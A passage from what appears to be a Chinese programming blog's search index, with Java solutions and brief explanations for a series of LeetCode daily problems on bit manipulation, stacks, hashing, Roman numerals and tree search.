    <content type="text"><![CDATA[题目：342. 4的幂难度：简单 给定一个整数，写一个函数来判断它是否是 4 的幂次方。如果是，返回 true ；否则，返回 false 。 整数 n 是 4 的幂次方需满足：存在整数 x 使得 n == 4x 示例 1： 12输入：n = 16输出：true 示例 2： 12输入：n = 5输出：false 示例 3： 12输入：n = 1输出：true 提示： -231 &lt;= n &lt;= 231 - 1 进阶： 你能不使用循环或者递归来完成本题吗？ 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/power-of-four/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 4的幂是2的偶数次幂，因此只需要在2的幂的基础上判断二进制中的1是否出现在偶数位置 解题代码12345678class Solution &#123; public boolean isPowerOfFour(int n) &#123; if (n &lt;= 0) &#123; return false; &#125; return (n &amp; (n - 1)) == 0 &amp;&amp; (n &amp; 0xaaaaaaaa) == 0; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>位运算</tag>
        <tag>数学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/5/30]]></title>
    <url>%2Fposts%2F667d38f0%2F</url>
    <content type="text"><![CDATA[题目：231. 2 的幂难度：简单 给你一个整数 n，请你判断该整数是否是 2 的幂次方。如果是，返回 true ；否则，返回 false 。 如果存在一个整数 x 使得 n == 2x ，则认为 n 是 2 的幂次方。 示例 1： 123输入：n = 1输出：true解释：20 = 1 示例 2： 123输入：n = 16输出：true解释：24 = 16 示例 3： 12输入：n = 3输出：false 示例 4： 12输入：n = 4输出：true 示例 5： 12输入：n = 5输出：false 提示： -231 &lt;= n &lt;= 231 - 1 进阶：你能够不使用循环/递归解决此问题吗？ 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/power-of-two/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 2的幂一定大于0,并且其二进制表示有且仅有一个1 解题代码12345678class Solution &#123; public boolean isPowerOfTwo(int n) &#123; if (n &lt;= 0) &#123; return false; &#125; return (n &amp; (n - 1)) == 0; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>位运算</tag>
        <tag>数学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/5/28]]></title>
    <url>%2Fposts%2F71bd8183%2F</url>
    <content type="text"><![CDATA[题目：477. 汉明距离总和难度：中等 两个整数的 汉明距离 指的是这两个数字的二进制数对应位不同的数量。 计算一个数组中，任意两个数之间汉明距离的总和。 示例: 1234567输入: 4, 14, 2输出: 6解释: 在二进制表示中，4表示为0100，14表示为1110，2表示为0010。（这样表示是为了体现后四位之间关系）所以答案为：HammingDistance(4, 14) + HammingDistance(4, 2) + HammingDistance(14, 2) = 2 + 2 + 2 = 6. 注意: 数组中元素的范围为从 0到 10^9。 数组的长度不超过 10^4。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/total-hamming-distance/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 计算每一位二进制所作出的贡献 解题代码123456789101112131415161718class Solution &#123; public int totalHammingDistance(int[] nums) &#123; int ans = 0; for (int i = 0;i &lt;= 31;i++) &#123; int c1 = 0; int c0 = 0; for (int n : nums) &#123; if (((n &gt;&gt; i) &amp; 1) == 1) &#123; c1++; &#125; else &#123; c0++; &#125; &#125; ans += c0 * c1; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>位运算</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/5/27]]></title>
    <url>%2Fposts%2Fe1029c12%2F</url>
    <content type="text"><![CDATA[题目：461. 汉明距离难度：简单 两个整数之间的汉明距离指的是这两个数字对应二进制位不同的位置的数目。 给出两个整数 x 和 y，计算它们之间的汉明距离。 注意：0 ≤ x, y &lt; 231. 示例: 12345678910输入: x = 1, y = 4输出: 2解释:1 (0 0 0 1)4 (0 1 0 0) ↑ ↑上面的箭头指出了对应二进制位不同的位置。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/hamming-distance/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 异或后统计二进制位上1的个数即可 解题代码1234567891011class Solution &#123; public int hammingDistance(int x, int y) &#123; int ans = 0; x = x ^ y; while (x != 0) &#123; ans++; x = x &amp; (x - 1); &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>位运算</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/5/26]]></title>
    <url>%2Fposts%2F9605ac84%2F</url>
    <content type="text"><![CDATA[题目：1190. 反转每对括号间的子串难度：中等 给出一个字符串 s（仅含有小写英文字母和括号）。 请你按照从括号内到外的顺序，逐层反转每对匹配括号中的字符串，并返回最终的结果。 注意，您的结果中 不应 包含任何括号。 示例 1： 12输入：s = &quot;(abcd)&quot;输出：&quot;dcba&quot; 示例 2： 12输入：s = &quot;(u(love)i)&quot;输出：&quot;iloveu&quot; 示例 3： 12输入：s = &quot;(ed(et(oc))el)&quot;输出：&quot;leetcode&quot; 示例 4： 12输入：s = &quot;a(bcdefghijkl(mno)p)q&quot;输出：&quot;apmnolkjihgfedcbq&quot; 提示： 0 &lt;= s.length &lt;= 2000 s 中只有小写英文字母和括号 我们确保所有括号都是成对出现的 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/reverse-substrings-between-each-pair-of-parentheses/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 用栈处理每一对括号出现的位置即可 解题代码12345678910111213141516171819202122232425class Solution &#123; public String reverseParentheses(String s) &#123; Stack&lt;Character&gt; st = new Stack&lt;&gt;(); for (char ch : s.toCharArray()) &#123; if (ch == ')') &#123; List&lt;Character&gt; t = new ArrayList&lt;&gt;(); char c = st.pop(); while (c != '(' &amp;&amp; !st.isEmpty()) &#123; t.add(c); c = st.pop(); &#125; for (int i = 0;i &lt; t.size();i++) &#123; st.push(t.get(i)); &#125; &#125; else &#123; st.push(ch); &#125; &#125; StringBuilder ans = new StringBuilder(); while (!st.isEmpty()) &#123; ans.append(st.pop()); &#125; return ans.reverse().toString(); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>栈</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/5/20]]></title>
    <url>%2Fposts%2F7f6609b1%2F</url>
    <content type="text"><![CDATA[题目：692. 前K个高频单词难度：中等 给一非空的单词列表，返回前 k 个出现次数最多的单词。 返回的答案应该按单词出现频率由高到低排序。如果不同的单词有相同出现频率，按字母顺序排序。 示例 1： 1234输入: [&quot;i&quot;, &quot;love&quot;, &quot;leetcode&quot;, &quot;i&quot;, &quot;love&quot;, &quot;coding&quot;], k = 2输出: [&quot;i&quot;, &quot;love&quot;]解析: &quot;i&quot; 和 &quot;love&quot; 为出现次数最多的两个单词，均为2次。 注意，按字母顺序 &quot;i&quot; 在 &quot;love&quot; 之前。 示例 2： 1234输入: [&quot;the&quot;, &quot;day&quot;, &quot;is&quot;, &quot;sunny&quot;, &quot;the&quot;, &quot;the&quot;, &quot;the&quot;, &quot;sunny&quot;, &quot;is&quot;, &quot;is&quot;], k = 4输出: [&quot;the&quot;, &quot;is&quot;, &quot;sunny&quot;, &quot;day&quot;]解析: &quot;the&quot;, &quot;is&quot;, &quot;sunny&quot; 和 &quot;day&quot; 是出现次数最多的四个单词， 出现次数依次为 4, 3, 2 和 1 次。 注意： 假定 k 总为有效值， 1 ≤ k ≤ 集合元素数。 输入的单词均由小写字母组成。 扩展练习： 尝试以 O(n log k) 时间复杂度和 O(n) 空间复杂度解决。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/top-k-frequent-words/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 计数排序后取前k个 解题代码1234567891011121314151617181920class Solution &#123; public List&lt;String&gt; topKFrequent(String[] words, int k) &#123; Map&lt;String,Integer&gt; count = new HashMap&lt;&gt;(); for (String w : words) &#123; count.put(w,count.getOrDefault(w,0) + 1); &#125; List&lt;String&gt; ans = new ArrayList&lt;&gt;(count.keySet()); Collections.sort(ans,(a,b)-&gt;&#123; int ca = count.get(a); int cb = count.get(b); if (ca == cb) &#123; return a.compareTo(b); &#125; return cb - ca; &#125;); return ans.subList(0,k); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>哈希表</tag>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/5/19]]></title>
    <url>%2Fposts%2F2d97e2d6%2F</url>
    <content type="text"><![CDATA[题目：1738. 找出第 K 大的异或坐标值难度：中等 给你一个二维矩阵 matrix 和一个整数 k ，矩阵大小为 m x n 由非负整数组成。 矩阵中坐标 (a, b) 的 值 可由对所有满足 0 &lt;= i &lt;= a &lt; m 且 0 &lt;= j &lt;= b &lt; n 的元素 matrix[i][j]（下标从 0 开始计数）执行异或运算得到。 请你找出 matrix 的所有坐标中第 k 大的值（k 的值从 1 开始计数）。 示例 1： 123输入：matrix = [[5,2],[1,6]], k = 1输出：7解释：坐标 (0,1) 的值是 5 XOR 2 = 7 ，为最大的值。 示例 2： 123输入：matrix = [[5,2],[1,6]], k = 2输出：5解释：坐标 (0,0) 的值是 5 = 5 ，为第 2 大的值。 示例 3： 123输入：matrix = [[5,2],[1,6]], k = 3输出：4解释：坐标 (1,0) 的值是 5 XOR 1 = 4 ，为第 3 大的值。 示例 4： 123输入：matrix = [[5,2],[1,6]], k = 4输出：0解释：坐标 (1,1) 的值是 5 XOR 2 XOR 1 XOR 6 = 0 ，为第 4 大的值。 提示： m == matrix.length n == matrix[i].length 1 &lt;= m, n &lt;= 1000 0 &lt;= matrix[i][j] &lt;= 106 1 &lt;= k &lt;= m * n 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/find-kth-largest-xor-coordinate-value/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 又是异或 写吐了 直接抄题解了 解题代码1234567891011121314151617181920class Solution &#123; public int kthLargestValue(int[][] matrix, int k) &#123; int m = matrix.length, n = matrix[0].length; int[][] pre = new int[m + 1][n + 1]; List&lt;Integer&gt; results = new ArrayList&lt;Integer&gt;(); for (int i = 1; i &lt;= m; ++i) &#123; for (int j = 1; j &lt;= n; ++j) &#123; pre[i][j] = pre[i - 1][j] ^ pre[i][j - 1] ^ pre[i - 1][j - 1] ^ matrix[i - 1][j - 1]; results.add(pre[i][j]); &#125; &#125; Collections.sort(results, new Comparator&lt;Integer&gt;() &#123; public int compare(Integer num1, Integer num2) &#123; return num2 - num1; &#125; &#125;); return results.get(k - 1); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>位运算</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/5/18]]></title>
    <url>%2Fposts%2F5a90d240%2F</url>
    <content type="text"><![CDATA[题目：1442. 形成两个异或相等数组的三元组数目难度：中等 给你一个整数数组 arr 。 现需要从数组中取三个下标 i、j 和 k ，其中 (0 &lt;= i &lt; j &lt;= k &lt; arr.length) 。 a 和 b 定义如下： a = arr[i] ^ arr[i + 1] ^ … ^ arr[j - 1] b = arr[j] ^ arr[j + 1] ^ … ^ arr[k] 注意：^ 表示 按位异或 操作。 请返回能够令 a == b 成立的三元组 (i, j , k) 的数目。 示例 1： 123输入：arr = [2,3,1,6,7]输出：4解释：满足题意的三元组分别是 (0,1,2), (0,2,2), (2,3,4) 以及 (2,4,4) 示例 2： 12输入：arr = [1,1,1,1,1]输出：10 示例 3： 12输入：arr = [2,3]输出：0 示例 4： 12输入：arr = [1,3,5,7,9]输出：3 示例 5： 12输入：arr = [7,11,12,9,5,2,7,17,22]输出：8 提示： 1 &lt;= arr.length &lt;= 300 1 &lt;= arr[i] &lt;= 10^8 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/count-triplets-that-can-form-two-arrays-of-equal-xor/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 这题其实是寻找原数组中连续的异或值为0的子数组的数量 解题代码123456789101112131415class Solution &#123; public int countTriplets(int[] arr) &#123; int ans = 0; for (int i = 0;i &lt; arr.length;i++) &#123; int xor = arr[i]; for (int j = i + 1;j &lt; arr.length;j++) &#123; xor ^= arr[j]; if (xor == 0) &#123; ans += j - i; &#125; &#125; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>数组</tag>
        <tag>位运算</tag>
        <tag>数学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/5/17]]></title>
    <url>%2Fposts%2Fca2fcfd1%2F</url>
    <content type="text"><![CDATA[题目：993. 二叉树的堂兄弟节点难度：简单 在二叉树中，根节点位于深度 0 处，每个深度为 k 的节点的子节点位于深度 k+1 处。 如果二叉树的两个节点深度相同，但父节点不同 ，则它们是一对堂兄弟节点。 我们给出了具有唯一值的二叉树的根节点 root ，以及树中两个不同节点的值 x 和 y 。 只有与值 x 和 y 对应的节点是堂兄弟节点时，才返回 true 。否则，返回 false。 示例 1： 12输入：root = [1,2,3,4], x = 4, y = 3输出：false 示例 2： 12输入：root = [1,2,3,null,4,null,5], x = 5, y = 4输出：true 示例 3： 12输入：root = [1,2,3,null,4], x = 2, y = 3输出：false 提示： 二叉树的节点数介于 2 到 100 之间。 每个节点的值都是唯一的、范围为 1 到 100 的整数。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/cousins-in-binary-tree/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 搜索一次 记录下每个节点的父节点和深度 解题代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354/** * Definition for a binary tree node. * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode() &#123;&#125; * TreeNode(int val) &#123; this.val = val; &#125; * TreeNode(int val, TreeNode left, TreeNode right) &#123; * this.val = val; * this.left = left; * this.right = right; * &#125; * &#125; */class Solution &#123; public boolean isCousins(TreeNode root, int x, int y) &#123; if (root == null) &#123; return false; &#125; map.put(root.val,new Node()); dfs(root,null); Node xNode = map.get(x); if (xNode == null) &#123; return false; &#125; Node yNode = map.get(y); if (yNode == null) &#123; return false; &#125; return xNode.parent != yNode.parent &amp;&amp; xNode.depth == yNode.depth; &#125; public void dfs(TreeNode s,TreeNode f) &#123; if (s == null) &#123; return; &#125; if (f != null) &#123; Node n = map.getOrDefault(s.val,new Node()); n.parent = f.val; n.depth = map.get(f.val).depth + 1; map.put(s.val,n); &#125; dfs(s.left,s); dfs(s.right,s); &#125; Map&lt;Integer,Node&gt; map = new HashMap&lt;&gt;(); class Node &#123; int parent = -1; int depth = 0; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>深度优先搜索</tag>
        <tag>dfs</tag>
        <tag>树</tag>
        <tag>二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/5/16]]></title>
    <url>%2Fposts%2Fbd28ff47%2F</url>
    <content type="text"><![CDATA[题目：421. 数组中两个数的最大异或值难度：中等 给你一个整数数组 nums ，返回 nums[i] XOR nums[j] 的最大运算结果，其中 0 ≤ i ≤ j &lt; n 。 进阶： 你可以在 O(n) 的时间解决这个问题吗？ 示例 1： 123输入：nums = [3,10,5,25,2,8]输出：28解释：最大运算结果是 5 XOR 25 = 28. 示例 2： 12输入：nums = [0]输出：0 示例 3： 12输入：nums = [2,4]输出：6 示例 4： 12输入：nums = [8,10,2]输出：10 示例 5： 12输入：nums = [14,70,53,83,49,91,36,80,92,51,66,70]输出：127 提示： 1 &lt;= nums.length &lt;= 2 * 104 0 &lt;= nums[i] &lt;= 231 - 1 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/maximum-xor-of-two-numbers-in-an-array/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 毫无上进心，只想写O(n^2)的算法 解题代码1234567891011121314class Solution &#123; public int findMaximumXOR(int[] nums) &#123; if (nums.length == 1) &#123; return 0; &#125; int ans = Integer.MIN_VALUE; for (int i = 0;i &lt; nums.length;i++) &#123; for (int j = i + 1;j &lt; nums.length;j++) &#123; ans = Math.max(ans,nums[i] ^ nums[j]); &#125; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>位运算</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/5/15]]></title>
    <url>%2Fposts%2F2421aefd%2F</url>
    <content type="text"><![CDATA[题目：13. 罗马数字转整数难度：简单 罗马数字包含以下七种字符: I， V， X， L，C，D 和 M。 12345678字符 数值I 1V 5X 10L 50C 100D 500M 1000 例如， 罗马数字 2 写做 II ，即为两个并列的 1。12 写做 XII ，即为 X + II 。 27 写做 XXVII, 即为 XX + V + II 。 通常情况下，罗马数字中小的数字在大的数字的右边。但也存在特例，例如 4 不写做 IIII，而是 IV。数字 1 在数字 5 的左边，所表示的数等于大数 5 减小数 1 得到的数值 4 。同样地，数字 9 表示为 IX。这个特殊的规则只适用于以下六种情况： I 可以放在 V (5) 和 X (10) 的左边，来表示 4 和 9。 X 可以放在 L (50) 和 C (100) 的左边，来表示 40 和 90。 C 可以放在 D (500) 和 M (1000) 的左边，来表示 400 和 900。 给定一个罗马数字，将其转换成整数。输入确保在 1 到 3999 的范围内。 示例 1: 12输入: &quot;III&quot;输出: 3 示例 2: 12输入: &quot;IV&quot;输出: 4 示例 3: 12输入: &quot;IX&quot;输出: 9 示例 4: 123输入: &quot;LVIII&quot;输出: 58解释: L = 50, V= 5, III = 3. 示例 5: 123输入: &quot;MCMXCIV&quot;输出: 1994解释: M = 1000, CM = 900, XC = 90, IV = 4. 提示： 1 &lt;= s.length &lt;= 15 s 仅含字符 (‘I’, ‘V’, ‘X’, ‘L’, ‘C’, ‘D’, ‘M’) 题目数据保证 s 是一个有效的罗马数字，且表示整数在范围 [1, 3999] 内 题目所给测试用例皆符合罗马数字书写规则，不会出现跨位等情况。 IL 和 IM 这样的例子并不符合题目要求，49 应该写作 XLIX，999 应该写作 CMXCIX 。 关于罗马数字的详尽书写规则，可以参考 罗马数字 - Mathematics 。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/roman-to-integer/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 直接模拟过程就可以了，这个题是昨天那个题的逆问题 解题代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152class Solution &#123; public int romanToInt(String s) &#123; int ans = 0; char left = '0'; for (int i = 0;i &lt; s.length();i++) &#123; char ch = s.charAt(i); switch (ch) &#123; case 'I': ans += 1; break; case 'V': ans += 5; if (left == 'I') &#123; ans -= 2; &#125; break; case 'X': ans += 10; if (left == 'I') &#123; ans -= 2; &#125; break; case 'L': ans += 50; if (left == 'X') &#123; ans -= 20; &#125; break; case 'C': ans += 100; if (left == 'X') &#123; ans -= 20; &#125; break; case 'D': ans += 500; if (left == 'C') &#123; ans -= 200; &#125; break; case 'M': ans += 1000; if (left == 'C') &#123; ans -= 200; &#125; break; &#125; left = ch; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>字符串</tag>
        <tag>数学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/5/14]]></title>
    <url>%2Fposts%2F53269e6b%2F</url>
    <content type="text"><![CDATA[题目：12. 整数转罗马数字难度：中等 罗马数字包含以下七种字符： I， V， X， L，C，D 和 M。 12345678字符 数值I 1V 5X 10L 50C 100D 500M 1000 例如， 罗马数字 2 写做 II ，即为两个并列的 1。12 写做 XII ，即为 X + II 。 27 写做 XXVII, 即为 XX + V + II 。 通常情况下，罗马数字中小的数字在大的数字的右边。但也存在特例，例如 4 不写做 IIII，而是 IV。数字 1 在数字 5 的左边，所表示的数等于大数 5 减小数 1 得到的数值 4 。同样地，数字 9 表示为 IX。这个特殊的规则只适用于以下六种情况： I 可以放在 V (5) 和 X (10) 的左边，来表示 4 和 9。 X 可以放在 L (50) 和 C (100) 的左边，来表示 40 和 90。 C 可以放在 D (500) 和 M (1000) 的左边，来表示 400 和 900。 给你一个整数，将其转为罗马数字。 示例 1: 12输入: num = 3输出: &quot;III&quot; 示例 2: 12输入: num = 4输出: &quot;IV&quot; 示例 3: 12输入: num = 9输出: &quot;IX&quot; 示例 4: 123输入: num = 58输出: &quot;LVIII&quot;解释: L = 50, V = 5, III = 3. 示例 5: 123输入: num = 1994输出: &quot;MCMXCIV&quot;解释: M = 1000, CM = 900, XC = 90, IV = 4. 提示： 1 &lt;= num &lt;= 3999 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/integer-to-roman/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 基于贪心思想模拟数字转换过程 解题代码1234567891011121314class Solution &#123; int[] values = &#123;1000,900,500,400,100,90,50,40,10,9,5,4,1&#125;; String[] labels = &#123;"M","CM","D","CD","C","XC","L","XL","X","IX","V","IV","I"&#125;; public String intToRoman(int num) &#123; StringBuilder builder = new StringBuilder(); for (int i = 0;i &lt; values.length;i++) &#123; while (num &gt;= values[i]) &#123; builder.append(labels[i]); num -= values[i]; &#125; &#125; return builder.toString(); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>字符串</tag>
        <tag>数学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/5/13]]></title>
    <url>%2Fposts%2Fcd420bc8%2F</url>
    <content type="text"><![CDATA[题目：1269. 停在原地的方案数难度：困难 有一个长度为 arrLen 的数组，开始有一个指针在索引 0 处。 每一步操作中，你可以将指针向左或向右移动 1 步，或者停在原地（指针不能被移动到数组范围外）。 给你两个整数 steps 和 arrLen ，请你计算并返回：在恰好执行 steps 次操作以后，指针仍然指向索引 0 处的方案数。 由于答案可能会很大，请返回方案数 模 10^9 + 7 后的结果。 示例 1： 1234567输入：steps = 3, arrLen = 2输出：4解释：3 步后，总共有 4 种不同的方法可以停在索引 0 处。向右，向左，不动不动，向右，向左向右，不动，向左不动，不动，不动 示例 2： 12345输入：steps = 2, arrLen = 4输出：2解释：2 步后，总共有 2 种不同的方法可以停在索引 0 处。向右，向左不动，不动 示例 3： 12输入：steps = 4, arrLen = 2输出：8 提示： 1 &lt;= steps &lt;= 500 1 &lt;= arrLen &lt;= 10^6 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/number-of-ways-to-stay-in-the-same-place-after-some-steps/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 先写普通的dfs搜索，一看数据量，知道一定会爆，然后优化一下改为记忆化搜索 解题代码123456789101112131415161718192021222324252627282930313233class Solution &#123; public int numWays(int steps, int arrLen) &#123; ms = new int[steps + 1][steps]; for (int i = 0;i &lt; ms.length;i++) &#123; Arrays.fill(ms[i],-1); &#125; return dfs(steps,0,arrLen); &#125; int[][] ms; int mod = (int) (1e9 + 7); int dfs(int steps,int c,int arrLen) &#123; if (steps == 0) &#123; if (c == 0) &#123; return 1; &#125; return 0; &#125; if (ms[steps][c] != -1) &#123; return ms[steps][c]; &#125; long a = 0; for (int i = -1;i &lt;= 1;i++) &#123; if (steps &gt;= c &amp;&amp; c + i &gt;= 0 &amp;&amp; c + i &lt; arrLen) &#123; a += dfs(steps - 1,c + i,arrLen) % mod; &#125; &#125; a %= mod; ms[steps][c] = (int) (a); return ms[steps][c]; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>记忆化搜索</tag>
        <tag>ms</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/5/12]]></title>
    <url>%2Fposts%2Fba453b5e%2F</url>
    <content type="text"><![CDATA[题目：1310. 子数组异或查询难度：中等 有一个正整数数组 arr，现给你一个对应的查询数组 queries，其中 queries[i] = [Li, Ri]。 对于每个查询 i，请你计算从 Li 到 Ri 的 XOR 值（即 arr[Li] xor arr[Li+1] xor … xor arr[Ri]）作为本次查询的结果。 并返回一个包含给定查询 queries 所有结果的数组。 示例 1： 12345678910111213输入：arr = [1,3,4,8], queries = [[0,1],[1,2],[0,3],[3,3]]输出：[2,7,14,8] 解释：数组中元素的二进制表示形式是：1 = 0001 3 = 0011 4 = 0100 8 = 1000 查询的 XOR 值为：[0,1] = 1 xor 3 = 2 [1,2] = 3 xor 4 = 7 [0,3] = 1 xor 3 xor 4 xor 8 = 14 [3,3] = 8 示例 2： 12输入：arr = [4,8,2,10], queries = [[2,3],[1,3],[0,0],[0,3]]输出：[8,0,4,4] 提示： 1 &lt;= arr.length &lt;= 3 * 10^4 1 &lt;= arr[i] &lt;= 10^9 1 &lt;= queries.length &lt;= 3 * 10^4 queries[i].length == 2 0 &lt;= queries[i][0] &lt;= queries[i][1] &lt; arr.length 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/xor-queries-of-a-subarray/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 虽然用java写暴力也能过，但题目明显不想让我们使用暴力的方式，因此我们使用前缀和（异或）进行预处理，然后利用异或的性质优化单次查询的时间复杂度 解题代码123456789101112131415class Solution &#123; public int[] xorQueries(int[] arr, int[][] queries) &#123; int[] prefix = new int[arr.length + 1]; for (int i = 1;i &lt;= arr.length;i++) &#123; prefix[i] = prefix[i - 1] ^ arr[i - 1]; &#125; int ans[] = new int[queries.length]; for (int i = 0;i &lt; queries.length;i++) &#123; int s = queries[i][0]; int e = queries[i][1]; ans[i] = prefix[s] ^ prefix[e + 1]; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>位运算</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/5/11]]></title>
    <url>%2Fposts%2F234c6ae4%2F</url>
    <content type="text"><![CDATA[题目：1734. 解码异或后的排列难度：中等 给你一个整数数组 perm ，它是前 n 个正整数的排列，且 n 是个 奇数 。 它被加密成另一个长度为 n - 1 的整数数组 encoded ，满足 encoded[i] = perm[i] XOR perm[i + 1] 。比方说，如果 perm = [1,3,2] ，那么 encoded = [2,1] 。 给你 encoded 数组，请你返回原始数组 perm 。题目保证答案存在且唯一。 示例 1： 123输入：encoded = [3,1]输出：[1,2,3]解释：如果 perm = [1,2,3] ，那么 encoded = [1 XOR 2,2 XOR 3] = [3,1] 示例 2： 12输入：encoded = [6,5,4,6]输出：[2,4,1,5,3] 提示： 3 &lt;= n &lt; 105 n 是奇数。 encoded.length == n - 1 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/decode-xored-permutation/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 开始没看懂题 于是照着提示写 写完了之后 就懂了 有点意思 解题代码123456789101112131415161718class Solution &#123; public int[] decode(int[] encoded) &#123; int n = encoded.length + 1; int[] ans = new int[n]; int x = 0; for (int i = 1;i &lt;= n;i++) &#123; x ^= i; &#125; ans[0] = x; for (int i = 1;i &lt; n - 1;i+=2) &#123; ans[0] ^= encoded[i]; &#125; for (int i = 1;i &lt; n;i++) &#123; ans[i] = ans[i - 1] ^ encoded[i - 1]; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>位运算</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/5/10]]></title>
    <url>%2Fposts%2F544b5a72%2F</url>
